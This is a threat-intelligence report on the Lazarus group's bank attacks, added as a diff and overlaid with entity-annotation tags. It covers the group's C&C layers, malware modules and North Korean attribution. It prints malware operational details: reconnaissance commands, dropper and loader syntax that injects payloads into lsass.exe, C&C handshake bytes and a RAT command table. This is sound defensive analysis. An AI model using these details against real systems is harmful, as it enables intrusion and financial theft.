@@ -1,0 +1,2847 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> 
+ARISEN
+
+ARCHITECTURE / TOOLS / ATTRIBUTION
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution2
+
+INTRODUCTION
+
+In <TIMESTAMP>February 2016</TIMESTAMP>, hackers reportedly attempted to steal approximately  
+1 billion USD from the <ORG>Central Bank of Bangladesh</ORG> through <SOFTWARE>SWIFT</SOFTWARE>. In <TIMESTAMP>February 2017</TIMESTAMP>, several Polish <INDUSTRY>banks</INDUSTRY> were compromised.
+
+Security researchers analysed the malware code, chiefly using this to attribute 
+activity to <THREAT_ACTOR>Lazarus</THREAT_ACTOR> group. As tools are often reused by different groups, while 
+helpful, malware analysis does not provide conclusive evidence of attribution.
+
+<ORG>Group-IB</ORG> researchers investigating <THREAT_ACTOR>Lazarus</THREAT_ACTOR> group collected a broad range 
+of data, both technical and strategic, which places clear attribution on <COUNTRY>North Korea</COUNTRY>. The team detected and thoroughly analyzed multiple layers of C&C 
+infrastructure used by <THREAT_ACTOR>Lazarus</THREAT_ACTOR> and have identified North Korean IP addresses 
+from which the attacks were ultimately controlled. The following report is 
+an overview of this group’s attack methodology for financial institutions, the 
+malware employed and review of their targets.
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution3
+
+Through analysis of <THREAT_ACTOR>Lazarus</THREAT_ACTOR> activity, <ORG>Group-IB</ORG> gained deep insight on a 
+complex botnet infrastructure built by the hacker group to conduct their 
+attacks. To mask malicious activity, the hackers used a three-layer architecture 
+of compromised servers with SSL encrypted channels established between 
+them. In addition to encrypted traffic, data sent through SSL channel was 
+additionally encrypted.  The attackers achieved anonymity by employing a 
+legitimate VPN client - <TOOL>SoftEther VPN</TOOL>. In some cases, they also used corporate 
+web servers that were part of the attacked infrastructure. 
+
+To control infected machines, the hackers employed multi-module tools, 
+attempting to complicate malware analysis. That said, they managed to 
+conduct several successful attacks without employing 0day exploits. <THREAT_ACTOR>Lazarus</THREAT_ACTOR> 
+demonstrated a flexible approach to attacks by applying different hacking tools, 
+which prevented their detection by endpoint security solutions.
+
+ 
+ 
+ 
+
+According to our investigation of the <THREAT_ACTOR>Lazarus</THREAT_ACTOR> infrastructure, the threat actors 
+connected to the end C&C layer (Layer3) from two North Korean IP addresses 
+<IOC>210.52.109.22</IOC> and <IOC>175.45.178.222</IOC>. The second IP-address relates to Potonggang 
+District, perhaps coincidentally, where <ORG>National Defence Commission</ORG is 
+located — the highest military body in <COUNTRY>North Korea</COUNTRY>
+
+Additional evidence was confirmed that <THREAT_ACTOR>Lazarus</THREAT_ACTOR> links to North Korean hackers 
+by <ORG>Group-IB</ORG> specialists through analysis of pubic sources. We found a news 
+report from a South Korean <ORG>Arirang</ORG> TV agency, dated <TIMESTAMP>2016</TIMESTAMP>, about an attack on 
+South Korean television stations and <INDUSTRY>banks</INDUSTRY> as part of <THREAT_ACTOR>DarkSeoul</THREAT_ACTOR> operation.  This 
+attack performed by North Korean hackers and was investigated by the <ORG>South Korea’s National Police Agency</ORG>, who detected two IP addresses <IOC>175.45.178.19</IOC> and 
+<IOC>175.45.178.97</IOC>, used by hackers to control malware. Both IP addresses are in the 
+same block of IP addresses the IP <IOC>175.45.178.222</IOC>, which was discovered by  
+<ORG>Group-IB</ORG> specialists.
+
+KEY  
+FINDINGS
+
+01
+
+Unique tools  
+and C&C infrastructure 
+
+Links to  
+<COUNTRY>North Korea</COUNTRY>
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> is purportedly controlled by <ORG>Bureau 121</ORG>, a division of the 
+<ORG>Reconnaissance General Bureau</ORG>, a <ORG>North Korean intelligence agency</ORG>.  
+<ORG>Bureau 121</ORG> is responsible for conducting military cyber campaigns.
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution4
+
+<TIMESTAMP>Since 2016</TIMESTAMP>, the hackers have tried to mask their activity by pretending to 
+be Russian hackers. They added specific debugging symbols and strings 
+containing Russian words to a new version of <MALWARE>Client_TrafficForwarder</MALWARE>, a 
+module designed to proxy network traffic. To protect their executables, 
+they used <TOOL>Enigma Protector</TOOL>, a commercial product, which was created by a 
+Russian software developer. They also used exploits for <SOFTWARE>Flash</SOFTWARE> and <SOFTWARE>SilverLight</SOFTWARE> 
+from sets of exploits created by Russian-speaking hackers.
+
+These masquerade techniques did initially mislead some researchers who 
+conducted express analysis of malicious code. 
+ 
+ 
+ 
+A state-sponsored hacker group <THREAT_ACTOR>Lazarus</THREAT_ACTOR> managed to gain fraudulent 
+access to the <SOFTWARE>SWIFT</SOFTWARE> network of attacked <INDUSTRY>banks</INDUSTRY>. This is believed to be a 
+growing trend: state-sponsored hackers are demonstrating an increased 
+interest in conducting attacks on financial institutions, which are considered 
+a component of the national critical infrastructure in some countries. At the 
+moment, only a few similar incidents have been detected. For example, 
+<TIMESTAMP>IN 2010-2013</TIMESTAMP> the <ORG>NSA</ORG> reportedly penetrated the <SOFTWARE>SWIFT</SOFTWARE> banking network and 
+monitored a number of <COUNTRY>Middle East</COUNTRY> <INDUSTRY>banks</INDUSTRY>. In late <TIMESTAMP>2016</TIMESTAMP>, attacks on Ukrainian 
+<INDUSTRY>banks</INDUSTRY> were conducted, allegedly as part of the <MALWARE>BlackEnergy</MALWARE> operation. 
+However, researchers expect that the number of attacks on financial 
+institutions by state-backed hackers may significantly increase in the future. 
+ 
+ 
+ 
+The earliest indicator of compromise detected by <ORG>Group-IB</ORG>  is dated <TIMESTAMP>March 2016</TIMESTAMP>. This was directly after the <ORG>Central Bank of Bangladesh</ORG> incident, 
+which took place in <TIMESTAMP>February 2016</TIMESTAMP>, where attackers attempted to steal $1 
+billion USD. Only a spelling mistake in an online bank transfer instruction 
+helped prevent them from stealing more than $81 million USD. Following 
+this incident, the group modified its tactics and tools, adapting them to the 
+changing environment and misleading researchers.
+
+Through analysis of compromised networks, <ORG>Group-IB</ORG> identified IP addresses 
+of universities in the <COUNTRY>US</COUNTRY>, <COUNTRY>Canada</COUNTRY>, <COUNTRY>Great Britain</COUNTRY>, <COUNTRY>India</COUNTRY>, <COUNTRY>Bulgaria</COUNTRY>, <COUNTRY>Poland</COUNTRY>, 
+<COUNTRY>Turkey</COUNTRY>, pharmaceutical companies in <COUNTRY>Japan</COUNTRY> and <COUNTRY>China</COUNTRY>, as well as government 
+subnets in various countries.
+
+Emerging trend
+
+Victims
+
+Masquerading  
+as Russian hackers 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution5
+
+To infiltrate systems of their interest, <THREAT_ACTOR>Lazarus</THREAT_ACTOR> conducted <TECHNIQUE>watering-hole</TECHNIQUE> attacks 
+leveraging compromised resources often visited by their potential victims, 
+such as websites of financial regulators and government agencies in several 
+countries.   
+ 
+Some of these resources are listed below: 
+
+• knf.gov.pl — <ORG>The Polish Financial Supervision Authority</ORG>
+
+• cnvb.gob.mx — <ORG>National Banking and Securities Commission</ORG>, <COUNTRY>Mexico</COUNTRY>
+
+• brou.com.uy —  <ORG>Banco de la República Oriental del Uruguay</ORG>, a state-owned  
+<INDUSTRY>bank</INDUSTRY> in <COUNTRY>Uruguay</COUNTRY>
+
+Through examination of a code on a web server with exploits, <ORG>Group-IB</ORG> specialists detected a list of 255 IP address ranges. That said, hackers 
+infected only those users who visited the website from a computer within the 
+specified IP range. Based on this list, researchers have compiled a map of the 
+countries that were of interest to the attackers, which is presented below.
+
+ATTACK 
+PREPARATION AND 
+IMPLEMENTATION
+
+2.1  Infection  
+of web resources
+
+02 To conduct attacks, the criminals 
+developed toolsets to control C&C 
+servers and infected machines, built 
+a three-layer C&C infrastructure, 
+and compromised dozens of large 
+web resources.
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution6
+
+To gain access to websites of <INDUSTRY>financial</INDUSTRY> regulators and <INDUSTRY>bank</INDUSTRY> local networks, 
+hackers used known vulnerabilities in <SOFTWARE>JBoss</SOFTWARE> and <SOFTWARE>Liferay</SOFTWARE>. They compiled an 
+exploit for <SOFTWARE>SilverLight</SOFTWARE> <CVE>CVE-2016-0034</CVE> (MS16-006) which earlier was included 
+into <MALWARE>RIG</MALWARE> and <MALWARE>Angler</MALWARE> exploit kits, they also used <MALWARE>Flash exploits</MALWARE> from <MALWARE>Neutrino Exploit Kit</MALWARE>.
+
+ 
+ 
+ 
+ 
+Attackers created a 3-tier infrastructure that consisted of compromised 
+servers, between which the hackers established SSL encrypted channels. The 
+network interaction with the attacked computer was carried out only from the 
+Layer 1 server, which acted as a C&C server. In some cases, hackers placed the 
+Layer 1 server inside the organization attacked in order to reduce the risk of 
+detection. They gained access to these servers by brute forcing passwords for 
+RDP. 
+
+Hackers used original set of tools:
+
+ 
+Through in-depth analysis of the tools used by the attackers, <ORG>Group-IB</ORG> 
+specialists identified the scheme of communications between nodes within 
+the C&C infrastructure.
+
+2.2  Establishment of C&C 
+infrastructure:  
+
+<MALWARE>ServerRAT</MALWARE> Used to manage windows-based server infrastructure
+
+Server_TrafficForwarder Forwards traffic from one external server to another  
+
+Backend_ Listener Establishes connection with servers with installed Server_
+RAT, gets commands directly from the threat actor
+
+<MALWARE>Admin_Tool</MALWARE> Admin tool to send commands to infected computers
+
+<SOFTWARE>SWIFT</SOFTWARE> toolbox Used to work with <SOFTWARE>SWIFT</SOFTWARE>, consists of Alliance software 
+Hook Files and <SOFTWARE>SWIFT</SOFTWARE> transactions Information 
+Harvester.
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution7
+
+<MALWARE>ServerRAT</MALWARE> was installed on all infrastructure levels to control the 
+compromised infrastructure 
+ 
+<MALWARE>ServerRAT</MALWARE> constantly listens on port 3365, to which attackers connected 
+to control the server. To ensure the availability of the specified port, 
+the malicious program added a special rule to the firewall that allowed 
+incoming connections to this port. Infected computers performed an 
+outgoing connection to the compromised server acting as proxy via port 
+443. Typically outbound connections on this port are allowed in corporate 
+networks.
+
+Based on analysis of the <MALWARE>ServerRAT</MALWARE> functionality, <ORG>Group-IB</ORG> specialists 
+identified that <MALWARE>ServerRAT</MALWARE> responds to certain requests in a specific way. 
+Keeping in mind that <MALWARE>ServerRAT</MALWARE> constantly keeps port 3365 open, we 
+scanned the Internet for open ports 3365. Following this, we checked a 
+list of detected servers to identify those servers where <MALWARE>ServerRAT</MALWARE> was 
+installed. As a result, <ORG>Group-IB</ORG> specialists received a list of 74 IP addresses, 
+which are presented in the Indicators of Compromise section.
+
+Server_TrafficForwarder was installed on the first and second server level 
+— this module redirected traffic from one server to another.  
+ 
+In some cases, Server_TrafficForwarder was installed on servers inside the 
+attacked organization. This approach allows the criminal to avoid detection 
+of suspicious connections to the external network or bypass network 
+connection restrictions with prohibited connections to the external network 
+from specific computers/servers, which is often applied by companies to 
+protect the most critical PCs, such as those of <SOFTWARE>SWIFT</SOFTWARE> operators. 
+
+Three-layer C&C server infrastructure
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution8
+
+After the start, Server_TrafficForwarder reads the contents of the key and 
+certificate files from the root directory that will be used to create an SSL 
+tunnel. That said, the file does not contain any information about the servers 
+to which traffic should be transferred. At the first start, hackers manually 
+specify the port to listen on as well as the address of the C&C server to 
+which traffic is to be sent. In the event the port is not specified, the program 
+listens on a random port and waits for incoming connections. 
+
+To verify communication with a compromised server, hackers check if the 
+client is appropriate: they send the first network request; when a response 
+is received from the client, they decrypt it and compare with a previously 
+known response. In the event the responses are different, the connection is 
+broken. 
+
+The table below contains all commands available:
+
+The only difference in the Server_TrafficForwarder configuration on Layer 
+1 and Layer 2 servers respectively is that Server_TrafficForwarder installed 
+on Layer 1 accepts traffic from port 443 and forwards it on the same port 
+of Layer 2. While Layer 2 accepts traffic on port 443 and forwards it to port 
+8080 of Layer 3.
+
+Commands Description
+
+0x1095 -
+
+0x1096 Collects and sends system 
+information
+
+0x10AA Gets the configuration
+
+0x10AB Changes the configuration 
+(including the port on which 
+it listens for connections)
+
+0x10AE -
+
+0x10AF -
+
+0x10B3 Reads a private key file and 
+sends it to the operator
+
+0x10B4 Records data to a file
+
+Commands Description
+
+NONE -
+
+GINF Collects and sends system 
+information
+
+GCFG Gets the configuration 
+
+SCFG Changes the configuration 
+(including the port on which 
+it listens connections) 
+
+SLEP -
+
+HIBN -
+
+LCLR Records data to a file
+
+LDWN Reads a private key file and 
+sends it to the operator
+
+Commands of the first version: Commands of the second version:
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution9
+
+To encrypt all of its network connections, the traffic forwarder uses the 
+statically linked wolfSSL libraries and SSL certificates which are generated 
+by a pre-defined template. The “Issued for“ field always contains a third-level 
+domain slash an email address.  
+
+A few examples are shown below: 
+
+• www.resfinan.com/emailAddress=info@resfinan.com
+
+• finews.otzo.com/emailAddress=master@otzo.com
+
+• host.global.com/emailAddress=info@host.global.com
+
+• latest.ignorelist.com/emailAddress=consult@latest.ignorelist.com 
+
+With information about this template, <ORG>Group-IB</ORG> specialists managed to detect 
+similar certificates and associated hosts. With these indicators, you can check 
+if your organization was, or is, under attack by <THREAT_ACTOR>Lazarus</THREAT_ACTOR>.
+
+ 
+<MALWARE>Backend_Listenerr</MALWARE> is software installed by attackers on Layer 3 servers. The 
+program performs communications with other servers, receives commands 
+from the administrator and sends them in chain order to the end infected 
+computer. 
+
+<MALWARE>Backend_Listenerr</MALWARE> listens on the two ports:
+
+• port 8080, to which it accepts SSL connections from Layer 2 servers.
+
+• port 9090, to which it accepts connections from the control system 
+(<MALWARE>Admin_Tool</MALWARE>). 
+
+To encrypt traffic, the wolfSSL open source library is used. After the 
+application is launched, the private key and certificate files are loaded from 
+the root directory. These files are used to encrypt traffic between the C&C 
+server and connected clients.
+
+To defend against security solutions designed to “unpack” SSL encrypted 
+traffic, <MALWARE>Backend_Listenerr</MALWARE> encrypts all data sent over an SSL channel using an 
+additional reversible encryption algorithm and performs legitimacy checks.  
+
+To reverse-engineer the protocol of server communications with clients, 
+<ORG>Group-IB</ORG> specialists have developed a client that successfully connects to 
+both above-mentioned ports.
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution10
+
+This allowed us to analyze communications between the Admin-Tool and 
+<MALWARE>Backend_Listenerr</MALWARE> and we discovered that: 
+
+<MALWARE>Admin_Tool</MALWARE> must have an key pair that is identical to the server 
+
+<MALWARE>Admin_Tool</MALWARE> sends a customized Hello-package that differs from the one 
+that is provided by the library. By default this package (msg) is specified in 
+the library as follows: 
+
+ 
+<MALWARE>Admin_Tool</MALWARE> sends an encrypted (special) packet with a length from the 
+previous packet (len). 
+
+The server decrypts the contents of the packet sent.After decryption, the 
+following conditions must be true:
+
+3
+
+4
+
+static unsigned char msg[4] = { 0x11, 0x00, 0x00, 0x00, };
+static unsigned char ecnrypted_str[17] = { 0x38, 0x94, 0x3C, 0x6A, 0x58, 0x39, 
+0x1A, 0x56, 0x81, 0x4B, 0x09, 0x99, 0x1D, 0xE0, 0xCF, 0x81, 0x3F };
+
+(DWORD)&decrypted_buff[5] == len 
+(DWORD)&decrypted_buff[15] == len
+
+where len is the length of the packet
+
+1
+
+2
+
+The correct Hello packet that will be accepted by <MALWARE>Backend_Listener</MALWARE> must be of the 
+following form:
+
+ 
+In fact, this is an information packet, rather than a Hello packet, and its first byte 
+contains the length of the next packet sent («len»), while the rest bytes must be zero 
+in this case.
+
+#ifndef WOLFSSL_ALT_TEST_STRINGS
+char msg[32] = «hello wolfssl!»;   /* GET may make bigger */
+
+static unsigned char msg[4] = { 0x11, 0x00, 0x00, 0x00, };
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution11
+
+<MALWARE>Admin_Tool</MALWARE>  sends DWORD with len2 < 201 where len2 is the length of the 
+next package.  
+
+<MALWARE>Admin_Tool</MALWARE> sends encrypted (special) package #2. It’s length is determined 
+in the previous package. 
+
+Server decrypts the content of the package, and the following rules should 
+work there after decryption: 
+
+VPN: the attackers installed <TOOL>SoftEther VPN</TOOL> (http://softether.net/) service 
+supported by <ORG>University of Tsukuba</ORG>, <COUNTRY>Japan</COUNTRY> on some servers to unsure 
+additional level of anonymity. 
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> have chosen this service for the following reasons:
+
+• This legitimate application isn’t detected by security solutions 
+
+• It can establish VPN connection via ICMP or DNS to avoid detection by network 
+security solutions 
+
+• It contains Dynamic DNS function, which means that if a compromised system has 
+a dynamic IP address, the attacker can always find it by DNS name connected to 
+the VPN client 
+
+• This VPN client supports <SOFTWARE>Windows</SOFTWARE>, <SOFTWARE>Linux</SOFTWARE>, <SOFTWARE>FreeBSD</SOFTWARE>, <SOFTWARE>Solaris</SOFTWARE>, <SOFTWARE>Mac OS X</SOFTWARE>
+
+6
+
+7
+
+static unsigned char ecnrypted_str[17] = {  
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+
+    0xC8, 0x88, 0xE0, 0xE4, 0x94, 0x85, 0xCC, 0xD1, 0x03, 0x00, 
+
+(DWORD)&decrypted_buff[4] == 0xD1CC8594  
+(DWORD)&decrypted_buff[8] == 3
+
+Only if all validity checks are made, the traffic is forwarded from one port to another in 2 
+streams. Following this, when the client connects to the first port (8080), the service will 
+forward the traffic from the first port to the second one, and back.
+
+The operators connected to port 9090 of Layer 3 servers from the following IP 
+addresses: 
+
+- <IOC>210.52.109.22</IOC> (<COUNTRY>North Korea</COUNTRY>)
+
+- <IOC>175.45.178.222</IOC> (<COUNTRY>North Korea</COUNTRY>)
+
+- <IOC>157.7.135.182</IOC> (<COUNTRY>Japan</COUNTRY>) and <IOC>202.101.36.45</IOC> (<COUNTRY>China</COUNTRY>) - via <TOOL>SoftEther VPN</TOOL>
+
+5
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution12
+
+In addition to multi-layer server structure, hackers developed a specialized 
+toolset to perform remote control over infected PCs.
+
+The group actively attempted to conceal their activity, complicating malware 
+detection and analysis as much as possible. All tools consist of modules, which 
+were delivered separately to target organizations only. To complicate malware 
+investigation, criminals encrypted and obfuscated their tools.
+
+Modular architecture of the victim’s infection process provides both additional 
+flexibility and anonymity throughout the cyber-attack. This scheme allows 
+hackers to divide software development activity between teams, as well as to 
+ensure the reuse of program code.
+
+<MALWARE>RECON</MALWARE> is a backdoor that is initially installed on the target machine through 
+successful execution of exploits. This module is used by hackers to perform 
+initial reconnaissance to search for systems of interest. 
+
+Once launched, the program adds itself to the auto-start by copying its file 
+to the directory "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\
+Start Menu\Programs\Startup", collects data about the system and network 
+environment and sends them to the C&C server. 
+
+2.3  Tools to control infected PCs 
+
+cmd.exe /c hostname
+cmd.exe /c whoami
+cmd.exe /c ver
+cmd.exe /c ipconfig -all
+cmd.exe /c ping www.google.com
+cmd.exe /c query user
+cmd.exe /c net user
+cmd.exe /c net view
+cmd.exe /c net view /domain
+cmd.exe /c reg query «HKCU\SOFTWARE\Microsoft\Windows\
+CurrentVersion\Internet Settings»
+cmd.exe /c tasklist /svc
+cmd.exe /c netstat -ano | find «TCP»
+
+Below is a list of data collected:
+
+<MALWARE>RECON</MALWARE> Performs initial reconnaissance to determine if a systems is of 
+interest to the threat actors
+
+<MALWARE>Dropper</MALWARE> Extracts and decrypts <MALWARE>Loader</MALWARE>
+
+<MALWARE>Loader</MALWARE> Decrypts the payload — <MALWARE>Client_RAT</MALWARE> or <MALWARE>Client_TrafficForwarder</MALWARE> 
+— and injects into the legitimate process
+
+<MALWARE>Client_TrafficForwarder</MALWARE> Forwards operator’s commands from external network into 
+corporate network
+
+<MALWARE>Client_RAT</MALWARE> Provides full control over the target system
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution13
+
+In the event the system is not of interest, the module will use the "killkill" 
+command to remove itself from the infected system. If the system is of interest, 
+then <MALWARE>RECON</MALWARE> downloads <MALWARE>Dropper</MALWARE> using the “http” command. <MALWARE>Dropper</MALWARE> will then 
+install <MALWARE>Client_RAT</MALWARE> to the infected system as follows: 
+
+<MALWARE>Dropper</MALWARE> extracts and decrypts <MALWARE>Loader</MALWARE>, embeds it into the system and 
+extracts <MALWARE>Client_RAT</MALWARE>.
+
+To decrypt the configuration file, <MALWARE>Dropper</MALWARE> needs MD5 encryption key, which 
+only the attacker knows.
+
+<ORG>Group-IB</ORG> specialists have analyzed two versions of <MALWARE>Dropper</MALWARE>. There are no 
+fundamental differences between them: both versions were used to decrypt 
+the loader and encrypted payload, as well as to ensure loader persistence in 
+the system.
+
+Arguments Description
+
+dropper.exe -l Enumerates system 
+services
+
+dropper.exe  -e 
+[path]
+
+Retrieves and decrypts 
+encrypted payload and 
+saves it to the specified file
+
+dropper.exe –a 
+[service name] 
+[path to DLL]
+
+Installs the library as a 
+service
+
+Arguments Description
+
+dropper.exe -x 
+[key] -l
+
+Enumerates system services
+
+dropper.exe 
+-x [key] -e 
+[servicename] 
+[config]
+
+Extracts and decrypts the payload 
+from config and sets it as a service
+
+dropper.exe -x 
+[key] -f
+
+Installs implants by adding 
+information about them to the 
+system registry
+
+dropper.exe 
+-x [key] -o 
+[eventname]
+
+Calls OpenEventA with a special 
+event name
+
+dropper.exe 
+-x [key] -t 
+
+Calls OpenEventA with a special 
+event name, then calls Setvent API
+
+Commands of the first version:
+
+Version 1 Version 2
+
+In addition, <MALWARE>Dropper</MALWARE> can read executable data from registry keys and embed 
+them in the selected process. The executable data is read from the following 
+registry keys:
+
+• HKLM\SYSTEM\CurrentControlSet\Services\<name of service>\Security\Data2
+
+• HKLM\SYSTEM\CurrentControlSet\Services\<name of service>\Security\Data3
+
+Commands of the second version
+
+<MALWARE>RECON</MALWARE>
+
+СИСТЕМНЫЕ 
+ПРОЦЕССЫ
+
+<MALWARE>Dropper</MALWARE>
+
+<MALWARE>Client_RAT</MALWARE>
+<MALWARE>Client_RAT</MALWARE>
+
+<MALWARE>Client_RAT</MALWARE>
+<MALWARE>Client_RAT</MALWARE>
+
+<MALWARE>Loader</MALWARE>
+
+<MALWARE>Dropper</MALWARE>
+<MALWARE>Loader</MALWARE>
+
+<MALWARE>Loader</MALWARE>
+<MALWARE>Dropper</MALWARE> decrypts 
+and embeds <MALWARE>Loader</MALWARE>
+extracts decrypted 
+<MALWARE>Client_RAT</MALWARE>
+
+<MALWARE>Loader</MALWARE> decrypts 
+and embeds 
+<MALWARE>Client_RAT</MALWARE>
+
+<MALWARE>RECON</MALWARE> decrypts 
+and embeds 
+<MALWARE>Dropper</MALWARE>
+
+2 31
+
+встраивание 
+в систему
+
+встраивание 
+в систему
+
+встраивание 
+в систему
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution14
+
+<MALWARE>Loader</MALWARE> is used to decrypt the payload — <MALWARE>Client_RAT</MALWARE> or <MALWARE>Client_TrafficForwarder</MALWARE> 
+— and inject it into the legitimate process (for example, in lsass.exe)
+
+Hackers manually specify the C&C server at the time when the main program 
+is started. That’s why even if researchers detect the loader they cannot 
+identify where the C&C server is located, by whom it is controlled, and which 
+port is used for connection. In some cases, an additional loader was used by 
+criminals.  
+
+Example of loader launch:   
+
+<MALWARE>Client_TrafficForwarder</MALWARE>
+
+This module was installed on one of the PCs in the internal network of the 
+attacked organization. It proxies traffic from C&C server to PCs in the local 
+network of the attacked organization.
+
+<MALWARE>Client_RAT</MALWARE>
+
+The <MALWARE>Client_RAT</MALWARE> program provides full control over the target system: it allows 
+you to analyze the system, download and execute files, transfer data from the 
+infected computer to the C&C server.
+
+Communications with the C&C server are performed over an encrypted SSL 
+channel. For this purpose, <MALWARE>Client_RAT</MALWARE> uses statically linked libcurl libraries, 
+version 7.47.1 (<TIMESTAMP>FEB 2016</TIMESTAMP>).
+
+loader.exe -d «encrypted_payload.bin» -p 1540 -s [encrypted_C&C:port] -r [encrypted_commands]
+
+Argument -d:
+Name of the file  
+
+where Client _Rat or  
+Client_Forwarder are stored 
+
+in encrypted form
+
+Argument -p:
+ID of the process (for example, lsass.
+
+exe) in which the payload –  <MALWARE>Client_RAT</MALWARE> 
+or <MALWARE>Client_TrafficForwarder</MALWARE> – should be 
+
+embedded
+
+ Two more arguments:
+ –r (functionality has not been 
+
+identified) and –s 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution15
+
+This program may execute the following commands received from the C&C 
+server:
+
+Command Description
+
+NONE Do not execute any commands
+
+GINF Collect and send extensive 
+system information about the 
+PC
+
+SLEP Do not execute any commands
+
+HIBN Do not execute any commands
+
+DRIV Get information about available 
+disks in the system
+
+DIRP List files with the specified 
+extension
+
+CHDR Change current directory
+
+RUNX Get the user token
+
+MOVE Rename specified file
+
+FTIM Set the timestamps of the file 
+%windir%/system32/kernel32.dll 
+to the specified file
+
+NEWF Create a new directory with the 
+specified name
+
+ZDWN Presumably download the file/
+files
+
+PEIN Inject code in the specified 
+process
+
+TCON Presumably connect to the 
+specified network node
+
+DIR List files in the selected 
+directory
+
+DIE Remove itself  
+from the system
+
+DEL Delete selected file
+
+WIPE Delete the selected file and 
+make it unrecoverable
+
+UPLD Upload the file to C&C
+
+SCFG Get a new bot configuration
+
+DRIV Enumerate installed drivers
+
+DOWN Download and run the file
+
+CMDL Run the command and upload 
+the result of its work to С&C
+
+GCFG Download bot configuration
+
+RUN Execute command
+
+PVEW List running processes
+
+PEEX Inject the code in the process 
+explorer.exe
+
+PKIL Terminate the process with the 
+selected PID
+
+DescriptionCommand
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution16
+
+Due to analysis of <THREAT_ACTOR>Lazarus</THREAT_ACTOR> infrastructure, <ORG>Group-IB</ORG> specialists have detected 
+that the attack was controlled from two IP addresses:
+
+• <IOC>210.52.109.22</IOC> belongs to an autonomous system <ORG>China Netcom</ORG>. However, some 
+sources indicate that the set of IPs <IOC>210.52.109.0/24</IOC> is assigned to <COUNTRY>North Korea</COUNTRY>.
+
+• <IOC>175.45.178.222</IOC> refers to a North Korean Internet service provider. The <SOFTWARE>Whois</SOFTWARE>
+service indicates that this address is allocated to the Potonggang District, 
+perhaps coincidentally, where <ORG>Natinal Defence Commission</ORG> is located — the 
+
+highest military body in <COUNTRY>North Korea</COUNTRY>
+
+Through investigation of public information, we came across a TV report 
+from a South Korean news agency <ORG>Arirang News</ORG> dated <TIMESTAMP>2016</TIMESTAMP> 
+
+On the screen behind the host, <ORG>Group-IB</ORG> specialists noticed two IP addresses 
+<IOC>175.45.178.19</IOC> and <IOC>175.45.178.97</IOC>, which had been used to control <MALWARE>Ghost RAT</MALWARE> 
+malware. Both IP addresses are in the same set of IP addresses as an IP address 
+<IOC>175.45.178.222</IOC> that was discovered by <ORG>Group-IB</ORG> specialists.
+
+The <ORG>South Korea’s National Police Agency</ORG> reportedly identified that the cyber-
+attack had been performed from the unfinished North Korean Ryugyong hotel. 
+<ORG>Group-IB</ORG> could not confirm this location attribution. 
+
+ATTACK 
+ORGANIZERS
+
+3.1  Involvement  
+of <COUNTRY>North Korea</COUNTRY> 
+
+03
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution17
+
+<ORG>1st Bureau Operations</ORG>
+
+<ORG>2nd Bureau Reconnaissance</ORG>
+
+<ORG>3rd Bureau Foreign Intelligence</ORG>
+
+<ORG>5th Bureau Inter-Korea Dialogue</ORG>
+
+<ORG>6th Bureau Technical</ORG>
+
+<ORG>7th Bureau Rear Services</ORG>
+
+<ORG>Bureau 121</ORG>
+
